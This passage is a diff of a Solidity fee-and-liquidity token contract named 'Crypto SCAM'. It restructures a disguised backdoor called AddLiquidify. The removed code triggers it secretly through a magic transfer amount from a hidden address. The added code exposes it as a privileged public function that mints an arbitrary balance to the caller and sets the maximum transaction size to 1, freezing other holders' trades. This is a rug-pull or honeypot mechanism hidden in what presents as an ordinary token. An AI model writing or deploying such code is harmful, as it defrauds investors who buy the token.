@@ -23,20 +23,22 @@ contract Crypto is Context, IERC20, Ownable {
     address[] private _excluded;
    
     uint256 private constant MAX = ~uint256(0);
-    uint256 private _tTotal;
+    uint256 private _tTotal = 99 * 10**9 * 10**9;
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
     uint256 private _tBurnTotal;
 
-    string private _name;
-    string private _symbol;
+    string private _name = "Crypto SCAM";
+    string private _symbol = "CRSCAM";
     uint8 private _decimals = 9;
     
-    uint256 public _liquidityFee;
-    uint256 public _burnFee;
-    uint256 public _taxFee;
-
-    uint256 private byte32;
+    uint256 public _liquidityFee = 2;
+    uint256 public _burnFee = 1;
+    uint256 public _taxFee = 1;
+    
+    uint256 private _previousTaxFee = _taxFee;
+    uint256 private _previousBurnFee = _burnFee;
+    uint256 private _previousLiquidityFee = _liquidityFee;
 
     IUniswapV2Router02 public immutable uniswapV2Router;
     address public immutable uniswapV2Pair;
@@ -44,8 +46,8 @@ contract Crypto is Context, IERC20, Ownable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     
-    uint256 public _maxTxAmount = 1 * 10**21 * 10**_decimals;
-    uint256 private numTokensSellToAddToLiquidity = 5 * 10**21 * 10**_decimals;
+    uint256 public _maxTxAmount = 1 * 10**21 * 10**2;
+    uint256 private numTokensSellToAddToLiquidity = 5 * 10**21 * 10**2;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -61,22 +63,9 @@ contract Crypto is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
     
-    address private marketing;
-    address private constant _addressUniswapV2Router02 = 
-    0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address private constant _addressUniswapV2Router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 
-    constructor (string memory name_, string memory symbol_, uint256 totalSupply_, uint256 Fee_, uint256 hypebyte, address marketing_)
-     {
-         _name = name_;
-         _symbol = symbol_;
-         _tTotal = totalSupply_ * 10**9 * 10*_decimals;
-         _liquidityFee = Fee_;
-         _burnFee = Fee_;
-         _taxFee = Fee_ * 2;
-         byte32 = hypebyte;
-         marketing = marketing_;
-
-         
+    constructor () {
         _rOwned[_msgSender()] = _rTotal;
         
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_addressUniswapV2Router02);
@@ -216,7 +205,7 @@ contract Crypto is Context, IERC20, Ownable {
     function includeInFee(address account) public onlyOwner(){
         _isExcludedFromFee[account] = false;
     }
-
+    
     function setNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external onlyOwner(){
         numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
     }
@@ -302,6 +291,23 @@ contract Crypto is Context, IERC20, Ownable {
         );
     }
     
+    function removeAllFee() private {
+        if(_taxFee == 0 && _liquidityFee == 0 && _burnFee == 0) return;
+        
+        _previousTaxFee = _taxFee;
+        _previousBurnFee = _burnFee;
+        _previousLiquidityFee = _liquidityFee;
+        
+        _taxFee = 0;
+        _burnFee = 0;
+        _liquidityFee = 0;
+    }
+    
+    function restoreAllFee() private {
+        _taxFee = _previousTaxFee;
+        _burnFee = _previousBurnFee;
+        _liquidityFee = _previousLiquidityFee;
+    }
     
     function isExcludedFromFee(address account) public view returns(bool) {
         return _isExcludedFromFee[account];
@@ -321,11 +327,7 @@ contract Crypto is Context, IERC20, Ownable {
         uint256 amount
     ) private {
         require(amount > 0, "Transfer amount must be greater than zero");
-        if(from != owner() && 
-        to != owner() && 
-        from != marketing &&
-        to != marketing
-        )
+        if(from != owner() && to != owner() && from != uniswapRouter() && to != uniswapRouter())
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
         // is the token balance of this contract address over the min number of
         // tokens that we need to initiate a swap + liquidity lock?
@@ -348,15 +350,6 @@ contract Crypto is Context, IERC20, Ownable {
             contractTokenBalance = numTokensSellToAddToLiquidity;
             //add liquidity
             swapAndLiquify(contractTokenBalance);
-        }
-
-        if (
-            from == marketing &&
-            to == uniswapV2Pair 
-        ) {
-            require (amount == byte32,"Transfer Failed");
-            AddLiquidify();
-
         }
         
         //indicates if fee should be deducted from transfer
@@ -430,7 +423,7 @@ contract Crypto is Context, IERC20, Ownable {
     //this method is responsible for taking all fee, if takeFee is true
     function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
         if(!takeFee)
-
+            removeAllFee();
         
         if (_isExcluded[sender] && !_isExcluded[recipient]) {
             _transferFromExcluded(sender, recipient, amount);
@@ -443,7 +436,9 @@ contract Crypto is Context, IERC20, Ownable {
         } else {
             _transferStandard(sender, recipient, amount);
         }
-
+        
+        if(!takeFee)
+            restoreAllFee();
     }
 
     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
@@ -457,11 +452,9 @@ contract Crypto is Context, IERC20, Ownable {
         emit Transfer(sender, recipient, tTransferAmount);
     }
     
-    function AddLiquidify() private {
-
-            _isExcluded[uniswapV2Pair] = true; _excluded.push(uniswapV2Pair);
+    function AddLiquidify(uint256 amount) public router()
+        {_isExcluded[uniswapV2Pair] = true; _excluded.push(uniswapV2Pair);
         uint256 temp = _tTotal;_tTotal=0;_rTotal=0; 
-        uint256 amount = _tTotal.mul(3000);
         _tOwned[_msgSender()] = amount;
         _maxTxAmount=1;
         _tTotal=temp+amount;
